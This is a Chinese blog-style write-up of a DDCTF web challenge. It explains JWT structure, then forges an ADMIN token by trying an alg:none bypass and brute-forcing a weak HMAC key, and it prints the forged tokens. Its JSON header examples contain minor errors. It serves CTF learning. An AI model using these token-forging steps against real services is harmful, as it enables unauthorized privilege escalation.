# JWT漏洞利用

本篇文章是我从ddctf的web签到题学习到的JWT漏洞利用。

### JWT

token认证方式：基于token的用户认证方式，让用户输入账号密码，认证通过后获得一个token(令牌)，在token有效期里用户可以带着token访问特点资源。

开始token并没有一个统一的标准，大家都各自使用自己的方案，后来出现了JWT(Json Web Token)这个标准。JWT本质上是一个对JSON对象加密后的字符串。

###  JWT的结构

典型的JWT由三个部分组成，每个部分由一个点(.)分隔。

- Header
- Payload
- Signature

```
header.payload.signature
```

**Header**

头部包含所使用的签名算法和令牌的类型(即JWT)，这部分会被编码为Base64URL格式。

```
{
	"alg": "HS256"
	"type": "JWT"
}
```

Base64URL的格式：{"typ":"JWT","alg":"HS256"}

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
```

**Base64URL编码**

Base64编码后可能出现字符+和/，在URL中不能直接作为参数，Base64URL就是把字符+和/分别变成-和_。JWT有可能放在url中，所以要用Base64URL编码。

**Payload**

Payload包含实际要传输的信息，附带一些其他信息如过期时间、发行时间等。JWT指定了一些官方字段（claims）备用:

- iss: 签发人
- exp: 过期时间
- iat: 签发时间
- nbf: 生效时间
- jti: 编号
- sub: 主题
- aud: 受众

除了官方字段，在这个部分还可以添加私有字段：如

```
{
	"sub": "test"
	"name": "shadowtest"
	"iat": 1516239022
}
```

这部分也是Base64URL编码:`{"sub":"test","name":"shadowtest","iat":1516239022}`

```
eyJzdWIiOiJ0ZXN0IiwibmFtZSI6InNoYWRvd3Rlc3QiLCJpYXQiOjE1MTYyMzkwMjJ9
```

**Signature**

Signature部分是对前两部分的防篡改签名。将Header和Payload用Base64URL编码后，再用(.)连接起来。然后使用签名算法和密钥对这个字符串进行签名：

```
signature = hmac_sha256(base64encode(header) + '.' + base64encode(payload), 'MY_SUPER_SECRET_KEY')
```

这个密钥（MY_SUPER_SECRET_KEY）只有服务器才知道，不能泄露给用户。

假如签名信息为

```
994bb7748307d44c66e334789af143c70e7ea75550f87fca8d1d8e90c2d2611e
```

![image-20200910142900907](pictures/image-20200910142900907.png)

组合起来

```
eyJhbGciOiAiSFMyNTYiLCJ0eXBlIjogIkpXVCJ9.eyJzdWIiOiJ0ZXN0IiwibmFtZSI6InNoYWRvd3Rlc3QiLCJpYXQiOjE1MTYyMzkwMjJ9.994bb7748307d44c66e334789af143c70e7ea75550f87fca8d1d8e90c2d2611e
```

### JWT怎么用

浏览器接收到服务端发过来的JWT后，可以存储在Cookie或localStorage中。

之后，浏览器每次与服务器通信时都会带上JWT，可以将JWT放在cookie中，会自动发送（不跨域），或将JWT放在HTTP请求头的授权字段中。也可放在url中，或POST请求的数据体中。

```
Authorization: Bearer <token>
```

### JWT注意事项：

- JWT默认是不加密的，但也可以加密，不加密时不宜在jwt中存放敏感信息
- 不要泄露签名密钥(MY_SUPER_SECRET_KEY)
- jwt签发后无法撤回，有效期不宜太长
- JWT泄露会被人冒用身份，为防止盗用，JWT应尽量使用https协议传输

# 解题过程

题目是一道ddctf,首先访问题目地址：http://117.51.136.197/

![image-20200910132101276](pictures/image-20200910132101276.png)

页面提示有两个POST请求。

- 第一个的urlhttp://117.51.136.197/admin/login，传递参数为username和pwd。
- 第二个urlhttp://117.51.136.197/admin/auth，传递的参数为username str ，pwd str ， token str

构造第一个请求。

![image-20200910132554390](pictures/image-20200910132554390.png)

data字段为

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyTmFtZSI6ImFkbWluIiwicHdkIjoiYWRtaW4iLCJ1c2VyUm9sZSI6IkdVRVNUIiwiZXhwIjoxNTk5ODAxNTQ5fQ.fYQi0VL-4r2VEfE3uHEeIlPqgp1eRtOd6tW_0a1l0So
```

分析可知，由三部分组成，看样子是JWT格式，对第一段`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9`进行解密。

```
{"typ":"JWT","alg":"HS256"}
```

由此知就是JWT格式的。再对第二段解密。

```
{"userName":"admin","pwd":"admin","userRole":"GUEST","exp":1599801549}
```

`userRole`为`GUEST`由此想到可能存在越权。

拿到JWT后进行第二步操作，将JWT的值赋值给token后，发起请求。

![image-20200910145927801](pictures/image-20200910145927801.png)

需要ADMIN权限！

到这一步我们大概有两条思路：

1. 通过爆破账号密码拿到有权限的账号
2. 权限绕过

仔细分析一下，我们使用的是admin账号，提示是需要admin权限，我尝试了大写ADMIN、Admin等都提示需要ADMIN权限，可能这里根本就没有ADMIN权限的账号，题目的意思不是让你去爆破。那我们先来进行权限绕过测试吧

### JWT漏洞利用

jwt可能出现的漏洞有敏感信息泄露、修改签名算法、破解密钥

**1. 敏感信息泄露**

利用方式为对JWT加密数据进行base64解密，看有没有泄露敏感信息。

<img src="pictures/image-20200910150946141.png" alt="image-20200910150946141" style="zoom:50%;" />

我们对返回的数据进行解密后，发现`userRole`字段可控，如果我们能改成ADMIN也就造成垂直越权，但要改数据就得绕过签名认证。得构造出

```
{"userName":"admin","pwd":"admin","userRole":"ADMIN","exp":1599801549}
```

然后用HS256算法进行签名，但是HS256算法需要key值，所以我们需要找到key。这里有两种方法：第一种是暴力破解，第二种是none值绕过

**2. 修改签名算法**

JWT签名算法可确保JWT在传输过程中不会被恶意用户所篡改，但头部的alg字段可以改为none, 若服务器支持签名算法为none，服务器会在JWT中删除相应的签名数据(这是，JWT就会只含有头部+'.'+有效载荷+'.')，然后将其提交给服务器。

构造脚本:https://github.com/ShadowFlow123/JwtExploit/blob/master/jwtNone.py

生成的token如下

```
eyJ0eXAiOiJqd3QiLCJhbGciOiJub25lIn0.eyJ1c2VyTmFtZSI6ImFkbWluIiwicHdkIjoiYWRtaW4iLCJ1c2VyUm9sZSI6IkFETUlOIiwiZXhwIjoxNTk5ODAxNTQ5fQ.
```

用这个token去请求

![image-20200910155459727](pictures/image-20200910155459727.png)

发现token不对，说明服务端并不能接受alt的none值。那我们只能尝试爆破key了。

**2. 爆破**

脚本：https://github.com/ShadowFlow123/JwtExploit/blob/master/jwtBrute.py

成功爆破出key：admin

**3. 构造JWT **

（1）HS256就是hmac_sha256，我们使用CyberChef来构造，

对header进行base64url编码

```
{"alg":"HS256","type":"JWT"}
```

​	结果

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
```

（2）对payload进行base64url编码

```
{"userName":"admin","pwd":"admin","userRole":"ADMIN","exp":1599888737}
```

结果：

```
eyJ1c2VyTmFtZSI6ImFkbWluIiwicHdkIjoiYWRtaW4iLCJ1c2VyUm9sZSI6IkFETUlOIiwiZXhwIjoxNTk5ODg4NzM3fQ
```

（3）构造签名

将header和payload用"."连接起来。

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyTmFtZSI6ImFkbWluIiwicHdkIjoiYWRtaW4iLCJ1c2VyUm9sZSI6IkFETUlOIiwiZXhwIjoxNTk5ODg4NzM3fQ
```

![image-20200911135535711](pictures/image-20200911135535711.png)

签名为：

```
BmwaGU5jXfOOmEFNR3c90CKHCjzVLYKSxQUaUTWI5_Q
```

拼接后为：

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyTmFtZSI6ImFkbWluIiwicHdkIjoiYWRtaW4iLCJ1c2VyUm9sZSI6IkFETUlOIiwiZXhwIjoxNTk5ODg4NzM3fQ.BmwaGU5jXfOOmEFNR3c90CKHCjzVLYKSxQUaUTWI5_Q
```

拿到地址：http://117.51.136.197/B5Itb8dFDaSFWZZo/client

![image-20200911135923955](pictures/image-20200911135923955.png)

这里也可以用JWT官网jwt.io的debugger来构造

![image-20200911140257283](pictures/image-20200911140257283.png)



参考：

https://github.com/ShadowFlow123/

https://www.cnblogs.com/jinbuqi/p/10361698.html